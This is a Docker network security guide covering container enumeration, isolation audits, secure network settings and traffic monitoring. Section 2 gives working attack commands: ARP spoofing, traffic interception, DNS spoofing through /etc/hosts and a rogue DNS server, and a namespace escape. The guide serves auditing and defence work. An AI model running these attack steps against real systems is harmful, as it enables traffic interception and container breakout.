# Docker Network Security Guide

> Techniques for auditing, attacking, and defending Docker network configurations in containerized environments.

---

## 1. Network Topology Discovery

### Container Network Enumeration

```bash
# List all Docker networks
docker network ls --format "{{.Name}}\t{{.Driver}}\t{{.Scope}}"

# Inspect network details
docker network inspect bridge --format '{{range .Containers}}{{.Name}}: {{.IPv4Address}}{{"\n"}}{{end}}'

# Map all container IPs
for net in $(docker network ls -q); do
    echo "=== $(docker network inspect $net --format '{{.Name}}') ==="
    docker network inspect "$net" --format '{{range .Containers}}  {{.Name}}: {{.IPv4Address}}{{"\n"}}{{end}}'
done

# Discover exposed ports
docker ps --format '{{.Names}}\t{{.Ports}}' | column -t
```

### Inter-Container Connectivity Testing

```bash
# Test connectivity between containers
docker exec container_a ping -c 1 container_b
docker exec container_a nc -zv container_b 80

# Full port scan between containers
docker exec container_a nmap -sT container_b -p 1-65535 --open

# Check DNS resolution within network
docker exec container_a nslookup container_b
docker exec container_a dig container_b.network_name
```

---

## 2. Network Attack Vectors

### ARP Spoofing in Bridge Networks

```bash
# Containers on default bridge share L2 — ARP spoofing possible
docker exec attacker apt-get install -y dsniff
docker exec attacker arpspoof -i eth0 -t victim_ip gateway_ip

# Intercept traffic between containers
docker exec attacker tcpdump -i eth0 -A 'host victim_ip and port 80'
```

### DNS Spoofing

```bash
# Override DNS in container (if DNS is container-local)
docker exec attacker bash -c 'echo "attacker_ip target-service" >> /etc/hosts'

# Set up rogue DNS server
docker run -d --name rogue-dns --network target_net \
  -v ./dns_records.conf:/etc/dnsmasq.conf \
  andyshinn/dnsmasq
```

### Network Namespace Escape

```bash
# If CAP_NET_ADMIN is available
ip link add veth0 type veth peer name veth1
ip link set veth1 netns 1  # Move to host namespace

# Access host network from container with host network mode
docker run --network host --rm alpine ip addr show
```

---

## 3. Network Segmentation Audit

### Isolation Verification

```bash
#!/bin/bash
# verify-isolation.sh — Test network isolation between containers
echo "=== Network Isolation Audit ==="

networks=$(docker network ls --format '{{.Name}}' | grep -v "bridge\|host\|none")

for net in $networks; do
    containers=$(docker network inspect "$net" --format '{{range .Containers}}{{.Name}} {{end}}')
    echo "Network: $net → Containers: $containers"
done

# Cross-network connectivity test
echo ""
echo "=== Cross-Network Tests ==="
for src in $(docker ps --format '{{.Names}}'); do
    for dst_ip in $(docker inspect --format '{{range .NetworkSettings.Networks}}{{.IPAddress}} {{end}}' $(docker ps -q)); do
        result=$(docker exec "$src" timeout 2 nc -zv "$dst_ip" 80 2>&1)
        echo "$result" | grep -q "succeeded\|open" && echo "[CONNECTED] $src → $dst_ip:80"
    done 2>/dev/null
done
```

### Firewall Rule Verification

```bash
# Check iptables rules for Docker
sudo iptables -L DOCKER -n -v
sudo iptables -L DOCKER-ISOLATION-STAGE-1 -n -v
sudo iptables -L DOCKER-ISOLATION-STAGE-2 -n -v

# Verify inter-network isolation via iptables
sudo iptables -L FORWARD -n -v | grep -i "docker\|br-"
```

---

## 4. Secure Network Patterns

### Internal-Only Networks

```bash
# Create internal network (no external access)
docker network create --internal --subnet 172.20.0.0/16 secure_net

# Verify no external access
docker run --rm --network secure_net alpine ping -c 1 8.8.8.8
# Should fail: network is internal

# Create with encryption (overlay)
docker network create --driver overlay --opt encrypted secure_overlay
```

### Network Policies (Docker Compose)

```yaml
# docker-compose.yml with network segmentation
services:
  frontend:
    networks: [frontend_net]
  backend:
    networks: [frontend_net, backend_net]
  database:
    networks: [backend_net]

networks:
  frontend_net:
    driver: bridge
  backend_net:
    driver: bridge
    internal: true  # No external access
```

---

## 5. Traffic Monitoring

### Container Traffic Analysis

```bash
# Capture all traffic for a specific container
CONTAINER_PID=$(docker inspect --format '{{.State.Pid}}' target_container)
sudo nsenter -t "$CONTAINER_PID" -n tcpdump -i eth0 -w /tmp/container_traffic.pcap

# Monitor bandwidth per container
docker stats --format "{{.Name}}\t{{.NetIO}}" --no-stream

# Real-time connection tracking
docker exec target_container ss -tunapl
```

### Egress Monitoring

```bash
# Detect unexpected outbound connections
docker exec app_container ss -tunap | grep ESTAB | awk '{print $5}' | cut -d: -f1 | sort -u | while read ip; do
    # Check if IP is expected
    grep -q "$ip" /opt/allowed_egress.txt || echo "[ALERT] Unexpected egress: $ip"
done
```
